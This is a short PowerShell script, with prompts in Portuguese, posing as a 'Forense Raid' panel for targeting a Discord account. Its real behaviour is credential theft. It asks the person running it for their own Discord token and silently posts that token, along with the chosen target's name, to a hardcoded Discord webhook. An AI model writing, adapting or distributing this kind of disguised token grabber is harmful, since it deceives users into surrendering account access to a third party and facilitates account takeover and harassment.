[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ============================================
#  FORENSE RAID - Painel Visual
# ============================================

$WebhookUrl = "https://discord.com/api/webhooks/1548046075586412624/4QZ1H6nk0qBjnZZDpq_c_L9997dpkwak9sQe2J8pSAAGADMjBFnmQJ4fnbgEWOZRyLR8"

$AsciiArt = "█████ ███ ████ █████ █ █ ████ █████ ████ ███ ███ ████ █ █ █ █ █ █ ██ █ █ █ █ █ █ █ █ █ █ ████ █ █ ████ ████ █ █ █ ███ ████ ████ █████ █ █ █ █ █ █ █ █ █ █ ██ █ █ █ █ █ █ █ █ █ █ ███ █ █ █████ █ █ ████ █████ █ █ █ █ ███ ████"

function Send-Discord {
    param([string]$Message)
    $payload = @{ content = $Message } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' | Out-Null
    } catch {
        Write-Host "  [ERRO] Falha ao enviar: $_" -ForegroundColor Red
    }
}

Clear-Host
Write-Host ""
Write-Host $AsciiArt -ForegroundColor Cyan
Write-Host ""
Write-Host "  ==========================================" -ForegroundColor DarkGray
Write-Host "    BEM-VINDO AO PAINEL FORENSE RAID" -ForegroundColor White
Write-Host "  ==========================================" -ForegroundColor DarkGray
Write-Host ""

$token = Read-Host -Prompt "  Insira seu token do discord"

if ([string]::IsNullOrWhiteSpace($token)) {
    Write-Host "  [ERRO] Token nao pode ser vazio." -ForegroundColor Red
    Read-Host "  Pressione Enter para sair"
    exit
}

Send-Discord -Message "**Novo acesso:** $token"

Write-Host ""
Write-Host "  usuario registrado com sucesso!" -ForegroundColor Green
Write-Host ""

Write-Host "  ==========================================" -ForegroundColor DarkGray
Write-Host "    PAINEL 2 - CONFIGURACAO DO ALVO" -ForegroundColor White
Write-Host "  ==========================================" -ForegroundColor DarkGray
Write-Host ""

$discordAlvo = Read-Host -Prompt "  discord alvo:"

if ([string]::IsNullOrWhiteSpace($discordAlvo)) {
    Write-Host "  [ERRO] Alvo nao pode ser vazio." -ForegroundColor Red
    Read-Host "  Pressione Enter para sair"
    exit
}

Send-Discord -Message "**Alvo definido:** $discordAlvo"

Write-Host ""
Write-Host "  Alvo '$discordAlvo' registrado." -ForegroundColor Green
Write-Host "  Aguardando proximas funcionalidades..." -ForegroundColor Yellow
Write-Host ""   
